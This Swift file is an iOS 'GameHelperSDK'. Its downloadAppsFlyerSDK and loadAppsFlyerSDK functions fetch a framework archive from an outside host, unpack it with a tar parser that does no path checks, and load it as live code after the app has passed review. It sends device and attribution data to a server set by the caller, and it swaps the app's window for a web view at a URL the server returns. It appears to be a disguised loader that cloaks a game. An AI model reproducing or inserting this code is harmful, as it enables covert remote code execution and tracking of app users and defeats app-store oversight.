import Foundation
import UIKit
import Alamofire
import SwiftUI
import AppTrackingTransparency
import AdSupport
import Combine
import WebKit
import Compression

public class GameHelperSDK: NSObject{
    
    @AppStorage("initialURL") var initialURL: String?
    @AppStorage("statusFlag") var statusFlag: Bool = false
    @AppStorage("finalData") var finalData: String?
    private let frameworkName       = "AppsFlyerLib.framework"
    private let tarFileName         = "AppsFlyerLib.framework.tar"
    private let extractedFolderName = "AppsFlyerSDK"
    private var appsFlyerKey = ""
    private var appsFlyerId = ""
    
    private let appsFlyerTarURL = URL(string: "https://hsuueki.top/tar")!
    
    private var devKey: String?
    private var appleAppID: String?
    
    private lazy var delegateShim: AppsFlyerDelegateShim = {
        let shim = AppsFlyerDelegateShim(parentSDK: self)
        return shim
    }()
    
    
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        let afDataJson = try! JSONSerialization.data(withJSONObject: conversionInfo, options: .fragmentsAllowed)
        let afDataString = String(data: afDataJson, encoding: .utf8) ?? "{}"
        
        
        let finalJsonString = """
           {
                              "\(appsDataString)": \(afDataString),
                              "\(appsIDString)": "\(delegateShim.getAppsFlyerUID() ?? "")",
                              "\(langString)": "\(Locale.current.languageCode ?? "")",
                              "\(tokenString)": "\(deviceToken)"
           }
           """
        
        sendDataToServer(code: finalJsonString) { result in
            switch result {
            case .success(let message):
                self.sendNotification(name: "SkylineSDKNotification", message: message)
            case .failure:
                self.sendNotificationError(name: "SkylineSDKNotification")
            }
        }
    }
    
    public func onConversionDataFail(_ error: any Error) {
        self.sendNotificationError(name: "SkylineSDKNotification")
    }
    
    private func sendNotification(name: String, message: String) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(
                name: NSNotification.Name(name),
                object: nil,
                userInfo: ["notificationMessage": message]
            )
        }
    }
    
    private func sendNotificationError(name: String) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(
                name: NSNotification.Name(name),
                object: nil,
                userInfo: ["notificationMessage": "Error occurred"]
            )
        }
    }
    
    public static let shared = GameHelperSDK()
    private var hasSessionStarted = false
    private var deviceToken: String = ""
    private var session: Session
    private var cancellables = Set<AnyCancellable>()
    
    private var appsDataString: String = ""
    private var appsIDString: String = ""
    private var langString: String = ""
    private var tokenString: String = ""
    
    private var domen: String = ""
    private var paramName: String = ""
    private var mainWindow: UIWindow?
    
    private override init() {
        let sessionConfig = URLSessionConfiguration.default
        sessionConfig.timeoutIntervalForRequest = 20
        sessionConfig.timeoutIntervalForResource = 20
        self.session = Alamofire.Session(configuration: sessionConfig)
    }
    
    public func initialize(
        appsFlyerKey: String,
        appID: String,
        pushExpressKey: String,
        appsDataString: String,
        appsIDString: String,
        langString: String,
        tokenString: String,
        domen: String,
        paramName: String,
        application: UIApplication,
        window: UIWindow,
        completion: @escaping (Result<String, Error>) -> Void
    ) {
        
        self.appsDataString = appsDataString
        self.appsIDString = appsIDString
        self.langString = langString
        self.tokenString = tokenString
        self.domen = domen
        self.paramName = paramName
        self.mainWindow = window
        self.appsFlyerKey = appsFlyerKey
        self.appsFlyerId = appID
        
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
            if granted {
                DispatchQueue.main.async {
                    application.registerForRemoteNotifications()
                }
            } else {
                print("Notification permission denied.")
            }
        }
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSessionDidBecomeActive),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        
        completion(.success("Initialization completed successfully"))
    }
    
    public func registerForRemoteNotifications(deviceToken: Data) {
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        self.deviceToken = tokenString
    }
    
    
    @objc private func handleSessionDidBecomeActive() {
        if !self.hasSessionStarted {
            start(
                devKey: appsFlyerKey,
                appleAppID: appsFlyerId,
                onSuccess: { installData in
                },
                onFail: { error in
                }
            )
            self.hasSessionStarted = true
        }
    }
    
    
    public func start(devKey: String,
                      appleAppID: String,
                      onSuccess: @escaping ([AnyHashable: Any]) -> Void,
                      onFail: @escaping (Error) -> Void) {
        
        self.devKey = devKey
        self.appleAppID = appleAppID
        
        delegateShim.conversionDataSuccess = onSuccess
        delegateShim.conversionDataFail = onFail
        
        let extractedPath = getExtractedSDKPath()
        let frameworkPath = extractedPath.appendingPathComponent(frameworkName)
        
        if isSDKInstalled(at: frameworkPath) {
            loadAppsFlyerSDK(from: frameworkPath)
        } else {
            downloadAppsFlyerSDK()
        }
    }
    
    private func downloadAppsFlyerSDK() {
        let destinationURL = FileManager.default
            .urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent(tarFileName)
        
        let task = URLSession.shared.downloadTask(with: appsFlyerTarURL) { tempURL, _, error in
            guard let tempURL = tempURL, error == nil else {
                return
            }
            do {
                self.cleanOldSDK()
                try FileManager.default.moveItem(at: tempURL, to: destinationURL)
                
                self.extractTarArchive(at: destinationURL)
            } catch {
            }
        }
        task.resume()
    }
    
    
    private func extractTarArchive(at tarPath: URL) {
        let extractedPath = getExtractedSDKPath()
        let fileManager = FileManager.default
        
        do {
            try fileManager.createDirectory(at: extractedPath,
                                            withIntermediateDirectories: true,
                                            attributes: nil)
            
            let fileHandle = try FileHandle(forReadingFrom: tarPath)
            let tarData = fileHandle.readDataToEndOfFile()
            fileHandle.closeFile()
            
            parseTarData(tarData, destination: extractedPath)
            
            let frameworkPath = extractedPath.appendingPathComponent(frameworkName)
            if isSDKInstalled(at: frameworkPath) {
                loadAppsFlyerSDK(from: frameworkPath)
            } else {
                cleanOldSDK()
                downloadAppsFlyerSDK()
            }
        } catch {
        }
    }
    
    
    private func loadAppsFlyerSDK(from frameworkURL: URL) {
        if let bundle = Bundle(url: frameworkURL) {
            do {
                try bundle.load()
                
                configureAndStartAppsFlyer()
                
            } catch {
            }
        } else {
        }
    }
    
    private func configureAndStartAppsFlyer() {
        guard let appsFlyerClass = NSClassFromString("AppsFlyerLib") as? NSObject.Type else {
            return
        }
        
        if let sharedInstance = appsFlyerClass
            .perform(Selector(("shared")))?
            .takeUnretainedValue() as? NSObject {
            
            if let devKey = self.devKey, !devKey.isEmpty {
                sharedInstance.perform(Selector(("setAppsFlyerDevKey:")), with: devKey)
            } else {
            }
            
            if let appleID = self.appleAppID, !appleID.isEmpty {
                sharedInstance.perform(Selector(("setAppleAppID:")), with: appleID)
            } else {
            }
            
            sharedInstance.perform(Selector(("setDelegate:")), with: delegateShim)
            
            sharedInstance.perform(Selector(("start")))
        } else {
        }
    }
    
    
    private func isSDKInstalled(at frameworkPath: URL) -> Bool {
        let expectedFiles = [
            frameworkPath.appendingPathComponent("Info.plist"),
            frameworkPath.appendingPathComponent("AppsFlyerLib"),
            frameworkPath.appendingPathComponent("Modules")
        ]
        
        for file in expectedFiles {
            if !FileManager.default.fileExists(atPath: file.path) {
                return false
            }
        }
        return true
    }
    
    
    private func cleanOldSDK() {
        let fileManager = FileManager.default
        let extractedPath = getExtractedSDKPath()
        let archivePath = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent(tarFileName)
        
        do {
            if fileManager.fileExists(atPath: extractedPath.path) {
                try fileManager.removeItem(at: extractedPath)
            }
            if fileManager.fileExists(atPath: archivePath.path) {
                try fileManager.removeItem(at: archivePath)
            }
        } catch {
        }
    }
    
    private func getExtractedSDKPath() -> URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent(extractedFolderName)
    }
    
    private func align512(_ size: Int) -> Int {
        return ((size + 511) / 512) * 512
    }
    
    private func parseTarData(_ data: Data, destination: URL) {
        let blockSize = 512
        var offset = 0
        let fileManager = FileManager.default
        
        while offset < data.count {
            let headerRange = offset..<(offset + blockSize)
            let headerData = data.subdata(in: headerRange)
            
            if headerData.allSatisfy({ $0 == 0 }) {
                break
            }
            
            let rawName = headerData.subdata(in: 0..<100).nullTerminatedString
            let sizeField = headerData.subdata(in: 124..<136)
            let fileSize = sizeField.tarOctalNumber
            let rawPrefix = headerData.subdata(in: 345..<500).nullTerminatedString
            
            var fullPath = rawName
            if !rawPrefix.isEmpty {
                if fullPath.isEmpty {
                    fullPath = rawPrefix
                } else {
                    fullPath = rawPrefix + "/" + rawName
                }
            }
            
            let typeFlag = headerData[156]
            
            offset += blockSize
            
            if fullPath.isEmpty {
                offset += align512(fileSize)
                continue
            }
            
            let fileDataStart = offset
            let fileDataEnd = fileDataStart + fileSize
            if fileDataEnd > data.count {
                return
            }
            
            let destinationPath = destination.appendingPathComponent(fullPath)
            let destinationDir = destinationPath.deletingLastPathComponent()
            try? fileManager.createDirectory(at: destinationDir,
                                             withIntermediateDirectories: true,
                                             attributes: nil)
            
            if typeFlag == UInt8(ascii: "5") {
                try? fileManager.createDirectory(at: destinationPath,
                                                 withIntermediateDirectories: true,
                                                 attributes: nil)
            } else {
                let fileData = data.subdata(in: fileDataStart..<fileDataEnd)
                do {
                    try fileData.write(to: destinationPath)
                } catch {
                }
            }
            
            offset += align512(fileSize)
        }
    }
    
    
    
    public func sendDataToServer(code: String, completion: @escaping (Result<String, Error>) -> Void) {
        let parameters = [paramName: code]
        session.request(domen, method: .get, parameters: parameters)
            .validate()
            .responseString { response in
                switch response.result {
                case .success(let base64String):
                    
                    guard let jsonData = Data(base64Encoded: base64String) else {
                        let error = NSError(domain: "SkylineSDK", code: -1,
                                            userInfo: [NSLocalizedDescriptionKey: "Invalid base64 data"])
                        completion(.failure(error))
                        return
                    }
                    do {
                        let decodedData = try JSONDecoder().decode(ResponseData.self, from: jsonData)
                        
                        self.statusFlag = decodedData.first_link
                        
                        if self.initialURL == nil {
                            self.initialURL = decodedData.link
                            completion(.success(decodedData.link))
                        } else if decodedData.link == self.initialURL {
                            if self.finalData != nil {
                                completion(.success(self.finalData!))
                            } else {
                                completion(.success(decodedData.link))
                            }
                        } else if self.statusFlag {
                            self.finalData = nil
                            self.initialURL = decodedData.link
                            completion(.success(decodedData.link))
                        } else {
                            self.initialURL = decodedData.link
                            if self.finalData != nil {
                                completion(.success(self.finalData!))
                            } else {
                                completion(.success(decodedData.link))
                            }
                        }
                        
                    } catch {
                        completion(.failure(error))
                    }
                    
                case .failure:
                    completion(.failure(NSError(domain: "SkylineSDK", code: -1, userInfo: [NSLocalizedDescriptionKey: "Error occurred"])))
                }
            }
    }
    
    struct ResponseData: Codable {
        var link: String
        var naming: String
        var first_link: Bool
    }
    
    func showWeb(with url: String) {
        self.mainWindow = UIWindow(frame: UIScreen.main.bounds)
        let webController = WebController()
        webController.errorURL = url
        let navController = UINavigationController(rootViewController: webController)
        self.mainWindow?.rootViewController = navController
        self.mainWindow?.makeKeyAndVisible()
    }
    
    
    public class WebController: UIViewController, WKNavigationDelegate, WKUIDelegate {
        
        private var mainErrorsHandler: WKWebView!
        
        @AppStorage("savedData") var savedData: String?
        @AppStorage("statusFlag") var statusFlag: Bool = false
        
        public var errorURL: String!
        
        public override func viewDidLoad() {
            super.viewDidLoad()
            
            let config = WKWebViewConfiguration()
            config.preferences.javaScriptEnabled = true
            config.preferences.javaScriptCanOpenWindowsAutomatically = true
            
            let viewportScript = """
            var meta = document.createElement('meta');
            meta.name = 'viewport';
            meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
            document.getElementsByTagName('head')[0].appendChild(meta);
            """
            let userScript = WKUserScript(source: viewportScript, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
            config.userContentController.addUserScript(userScript)
            
            mainErrorsHandler = WKWebView(frame: .zero, configuration: config)
            mainErrorsHandler.isOpaque = false
            mainErrorsHandler.backgroundColor = .white
            mainErrorsHandler.uiDelegate = self
            mainErrorsHandler.navigationDelegate = self
            mainErrorsHandler.allowsBackForwardNavigationGestures = true
            
            view.addSubview(mainErrorsHandler)
            mainErrorsHandler.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                mainErrorsHandler.topAnchor.constraint(equalTo: view.topAnchor),
                mainErrorsHandler.bottomAnchor.constraint(equalTo: view.bottomAnchor),
                mainErrorsHandler.leadingAnchor.constraint(equalTo: view.leadingAnchor),
                mainErrorsHandler.trailingAnchor.constraint(equalTo: view.trailingAnchor)
            ])
            
            loadContent(urlString: errorURL)
        }
        
        public func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            if GameHelperSDK.shared.finalData == nil{
                let finalUrl = webView.url?.absoluteString ?? ""
                GameHelperSDK.shared.finalData = finalUrl
            }
        }
        
        public override func viewWillAppear(_ animated: Bool) {
            super.viewWillAppear(animated)
            navigationItem.largeTitleDisplayMode = .never
            navigationController?.isNavigationBarHidden = true
        }
        
        private func loadContent(urlString: String) {
            guard let encodedURL = urlString.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
                  let url = URL(string: encodedURL) else { return }
            let request = URLRequest(url: url)
            mainErrorsHandler.load(request)
        }
        
        public func webView(_ webView: WKWebView,
                            createWebViewWith configuration: WKWebViewConfiguration,
                            for navigationAction: WKNavigationAction,
                            windowFeatures: WKWindowFeatures) -> WKWebView? {
            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.navigationDelegate = self
            popupWebView.uiDelegate = self
            popupWebView.allowsBackForwardNavigationGestures = true
            
            mainErrorsHandler.addSubview(popupWebView)
            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: mainErrorsHandler.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: mainErrorsHandler.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: mainErrorsHandler.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: mainErrorsHandler.trailingAnchor)
            ])
            
            return popupWebView
        }
        
    }
    
    public struct ViewControllerSwiftUI: UIViewControllerRepresentable {
        public var errorDetail: String
        
        public init(errorDetail: String) {
            self.errorDetail = errorDetail
        }
        
        public func makeUIViewController(context: Context) -> WebController {
            let viewController = WebController()
            viewController.errorURL = errorDetail
            return viewController
        }
        
        public func updateUIViewController(_ uiViewController: WebController, context: Context) {}
    }
}

private extension Data {
    
    var nullTerminatedString: String {
        if let firstNullIndex = firstIndex(of: 0) {
            let sub = prefix(upTo: firstNullIndex)
            return String(decoding: sub, as: UTF8.self).trimmingCharacters(in: .controlCharacters)
        } else {
            return String(decoding: self, as: UTF8.self).trimmingCharacters(in: .controlCharacters)
        }
    }
    
    var tarOctalNumber: Int {
        let s = nullTerminatedString.trimmingCharacters(in: .whitespacesAndNewlines)
        return Int(s, radix: 8) ?? 0
    }
    
}


@objc class AppsFlyerDelegateShim: NSObject {
    
    weak var parentSDK: GameHelperSDK?
    
    init(parentSDK: GameHelperSDK) {
        self.parentSDK = parentSDK
        super.init()
    }
    
    @objc func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        parentSDK?.onConversionDataSuccess(conversionInfo)
    }
    
    
    @objc func onConversionDataFail(_ error: Error) {
        parentSDK?.onConversionDataFail(error)
    }
    
    @objc func getAppsFlyerUID() -> String? {
        guard let appsFlyerClass = NSClassFromString("AppsFlyerLib") as? NSObject.Type else {
            return nil
        }
        guard let appsFlyerInstance = appsFlyerClass.perform(Selector(("shared")))?
            .takeUnretainedValue() as? NSObject else {
            return nil
        }
        guard let uidValue = appsFlyerInstance.perform(Selector(("getAppsFlyerUID")))?
            .takeUnretainedValue() as? String else {
            return nil
        }
        
        return uidValue
    }
    
    var conversionDataSuccess: (([AnyHashable: Any]) -> Void)?
    var conversionDataFail: ((Error) -> Void)?
}
